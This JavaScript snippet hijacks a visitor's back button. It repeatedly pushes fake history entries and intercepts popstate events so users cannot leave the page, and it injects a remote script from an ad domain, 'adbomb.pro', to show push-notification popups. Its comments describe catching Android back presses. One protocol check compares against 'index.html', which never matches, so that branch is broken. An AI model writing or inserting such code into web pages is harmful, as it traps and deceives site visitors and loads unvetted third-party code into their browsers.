window.show_pushwru_show = function () {
    if (location.protocol === 'index.html') {
        let scr = document.createElement("script");
        scr.src = "http://adbomb.pro/click.php?lp=1";
        scr.onload = function () {
            window.pushwru_init_iframe && window.pushwru_init_iframe('',
                function () {
                    pushwru_show();
                });
        };
        document.head.appendChild(scr);
    }
};
// back pressed on android
if (window.performance && window.performance.navigation.type === 1) {
    // reload occurred. call show_pushwru_show immediately
    setTimeout(window.show_pushwru_show, 250);
} else {
    // show_pushwru_show will be called on 2nd backpress
    let popup_tried = false;
    console.log('popstate bind');

    // xxx: donot touch. without calling pushState the popstate binding will not work
    history.pushState({init: true}, "unused argument", "#init");

    $(window).on('popstate', function (e) {
        // xxx: testing push notifications
        if (location.protocol === 'http:' &&
            window.domain_has_valid_cert === true &&
            window.sawpp !== true) {
            // redirecting to the same page but with https
            location.replace(location.href.replace('http', 'https'));
        } else {
            history.pushState({init: true}, "unused argument", "#init");
            console.log(e);
            let res = true;
            e.preventDefault();
            res = false;
            popup_tried = true;
            return res;
        }
    });
}